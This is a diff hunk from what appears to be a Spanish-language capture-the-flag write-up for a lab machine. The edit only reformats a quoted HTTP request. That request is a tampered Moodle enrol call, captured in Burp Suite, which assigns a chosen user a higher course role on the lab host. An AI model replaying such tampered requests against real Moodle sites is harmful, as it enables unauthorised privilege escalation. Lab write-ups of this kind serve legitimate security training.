@@ -300,10 +300,11 @@ Por lo tanto, nuestra petición interceptada deberia lucir de la siguiente forma
 `(Modified request intercepted by Burpsuite)`
 
 >GET /moodle/enrol/manual/ajax.php?mform_showmore_main=0&id=5&action=enrol&enrolid= 10&sesskey=l7mA1kfKdK&_qf__enrol_manual_enrol_users_form=1&mform_showmore_id_main=0 &userlist%5B%5D=```24```&roletoassign=```1```&startdate=4&duration= HTTP/1.1
-Host: moodle.schooled.htb
-.
-.
-<SNIP>
+
+>Host: moodle.schooled.htb
+>.
+>.
+><SNIP>
 
 Una vez enviada la petición mediante el **Burpsuite Repeater** , en la sección **Proxy** de **Burpsuite**, let's drop the intercepted request.
 
